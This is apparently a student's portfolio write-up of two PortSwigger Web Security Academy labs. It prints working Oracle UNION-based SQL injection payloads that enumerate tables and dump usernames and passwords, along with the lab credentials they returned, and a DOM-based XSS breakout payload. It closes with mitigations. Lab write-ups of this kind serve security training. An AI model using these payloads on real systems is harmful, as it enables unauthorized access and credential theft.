# Browser Attacks Analysis: SQL Injection and DOM-Based XSS

## Project Overview

This project, completed during my GoMyCode cybersecurity training, demonstrates my ability to identify and exploit browser-based vulnerabilities using Burp Suite on PortSwigger’s Web Security Academy. I performed a SQL injection attack to extract user credentials from an Oracle database and a DOM-based XSS attack to execute malicious JavaScript. I also proposed mitigation strategies to secure web applications. This project showcases my skills in vulnerability assessment, offensive security testing, and defensive mitigation, critical for roles like cybersecurity engineer or penetration tester.

---

## Objectives

- Perform a SQL injection attack to extract usernames and passwords.
- Execute a DOM-based XSS attack via the browser’s address bar.
- Understand how SQL injection and DOM-based XSS vulnerabilities work.
- Propose mitigation strategies to prevent such attacks.

---

## Tools and Technologies

- **Platform:** PortSwigger Web Security Academy
- **Tool:** Burp Suite Community Edition
- **Labs:**
    - SQL Injection: [PortSwigger SQL Injection Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
    - DOM-Based XSS: [PortSwigger DOM-Based XSS Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
- **Environment:** Local machine with Burp Suite installed, Kali Linux for screenshot capture
- **Resources:** GoMyCode Learn platform, PortSwigger documentation

---

## Project Setup

### Environment Configuration

- Created an account on PortSwigger Web Security Academy.
- Installed Burp Suite Community Edition on a local machine.
- Enabled Proxy Intercept and used the embedded browser.

### Lab Access

- Accessed the SQL injection and DOM-based XSS labs via provided URLs.

### Screenshot Capture

- Used `scrot` on Kali Linux (`scrot screenshot.png`) or Snipping Tool on Windows to capture Burp Suite outputs and lab results.

---

## Process and Implementation

### Step 1: SQL Injection Attack

**Lab:** Listing database contents on Oracle.

- Intercepted a GET request (`/filter?category=Accessories`) using Burp Suite Proxy.
- Sent to Repeater and tested SQL injection with:
  ```
  '+UNION+SELECT+'abc','def'+FROM+dual--
  ```
  - Confirmed two text columns in the response.
- Retrieved table names with:
  ```
  '+UNION+SELECT+table_name,NULL+FROM+all_tables--
  ```
  - Identified `USERS_ZTHJPQ` as the credentials table.
- Listed columns with:
  ```
  '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ZTHJPQ'--
  ```
  - Found `EMAIL`, `USERNAME_XNOUTA`, `PASSWORD_FLARRA`.
- Extracted credentials with:
  ```
  '+UNION+SELECT+EMAIL||':'||USERNAME_XNOUTA||':'||PASSWORD_FLARRA,NULL+FROM+USERS_ZTHJPQ--
  ```
  - Output: `administrator:5sn3di4o91e5qay5y9lk, carlos:qhdccf86gear4wsxqaso, wiener:2pd9uvosk1r3su850ac3`
- Logged in as administrator with password `5sn3di4o91e5qay5y9lk` to solve the lab.

**Outcome:** Successfully extracted admin credentials and accessed the system.

---

### Step 2: DOM-Based XSS Attack

**Lab:** DOM-based XSS via document.write sink.

- Entered a random string (`test123`) in the search box, observed `<img src="test123">` in the DOM via browser developer tools.
- Injected payload in the URL:
  ```
  ?search="><svg onload=alert(1)>
  ```
  - Payload broke out of the `src` attribute, triggering `alert(1)` via the `<svg>` tag’s `onload` event.

**Outcome:** Alert executed, confirming XSS vulnerability and solving the lab.

---

### Step 3: Mitigation Strategies

**SQL Injection:**
- Use prepared statements to prevent query manipulation.
- Implement input validation and sanitization.
- Deploy a Web Application Firewall (WAF) to filter malicious payloads.

**DOM-Based XSS:**
- Avoid unsafe JavaScript functions (e.g., `document.write`).
- Sanitize and escape user inputs in the DOM.
- Use Content Security Policy (CSP) to restrict script execution.

**General:**
- Monitor with SIEM tools (e.g., Splunk) for suspicious activity.
- Conduct regular penetration testing.

---

## Challenges and Solutions

- **Challenge:** Identifying the correct table and column names in the SQL injection lab.  
  **Solution:** Systematically tested payloads to list tables and columns, referencing PortSwigger’s Oracle-specific syntax.
- **Challenge:** Crafting a precise XSS payload to trigger `alert(1)`.  
  **Solution:** Inspected the DOM to understand `document.write` behavior and tested attribute breakout.
- **Challenge:** Navigating Burp Suite’s Proxy and Repeater for the first time.  
  **Solution:** Followed GoMyCode tutorials and PortSwigger documentation, practicing with sample requests.

---

## Results and Outcomes

- Successfully exploited SQL injection to extract admin credentials and gain unauthorized access.
- Executed a DOM-based XSS attack, triggering a JavaScript alert in the victim’s browser.
- Proposed mitigation strategies to secure web applications against SQL injection and XSS.
- Captured 17 screenshots of Burp Suite outputs, payloads, DOM inspection, and lab completion messages.

---

## Screenshots

[Browser Attacks Analysis: SQL Injection and DOM-Based XSS – Screenshots](https://docs.google.com/document/d/1_I2HMusB5gmaYY3f5RdZ9oI94oh-FLRz2DDHDbEyIIc/edit?usp=sharing)


- `burp_proxy_get.png`: Intercepted GET request in Burp Suite Proxy.
- `repeater_test_sqli.png`: Repeater with `'+UNION+SELECT+'abc','def'+FROM+dual--` payload.
- `repeater_table_names.png`: Repeater showing table names (`USERS_ZTHJPQ`).
- `repeater_columns.png`: Repeater showing column names (`EMAIL, USERNAME_XNOUTA, PASSWORD_FLARRA`).
- `repeater_credentials.png`: Repeater with extracted credentials.
- `login_page_success.png`: Admin login page with successful authentication.
- `xss_search_input.png`: Browser showing `test123` in search box.
- `xss_dom_inspection.png`: Developer tools showing `<img src="test123">`.
- `xss_alert_popup.png`: Browser URL with XSS payload `"><svg onload=alert(1)>` showing Alert popup confirming XSS execution.
- `lab_solved.png`: PortSwigger “Solved” confirmation message.

---

## Lessons Learned

- Gained proficiency in using Burp Suite for intercepting and modifying HTTP requests.
- Learned SQL injection techniques specific to Oracle databases.
- Understood the client-side nature of DOM-based XSS and its exploitation.
- Developed skills in proposing defensive strategies like input validation and WAF deployment.
- Improved screenshot capture and documentation for technical reporting.

---

## Relevance to Cybersecurity

This project mirrors real-world penetration testing and vulnerability assessment tasks, critical for cybersecurity engineers and penetration testers. Exploiting SQL injection and XSS demonstrates offensive security skills, while proposing mitigations highlights defensive expertise, aligning with SOC analyst and security engineer roles in securing web applications.

---

## Future Improvements

- Simulate similar attacks in TryHackMe or Hack The Box labs (e.g., “Web Fundamentals”).
- Develop a Python script to automate SQL injection payload testing.
- Test mitigation strategies (e.g., WAF, CSP) in a local web server environment.
- Explore advanced XSS types (e.g., stored XSS, reflected XSS) in additional labs.

---

## How to Run

1. Create a PortSwigger Web Security Academy account and access the labs:
    - [SQL Injection Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
    - [DOM-Based XSS Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
2. Install Burp Suite Community Edition and enable Proxy Intercept.
3. Follow the SQL injection steps using Burp Suite’s Proxy and Repeater.
4. Execute the DOM-based XSS attack by modifying the URL search parameter.

---

> Project completed as part of GoMyCode’s cybersecurity training  
> **Author:** Jeremiah Dighomanor (Digho007)
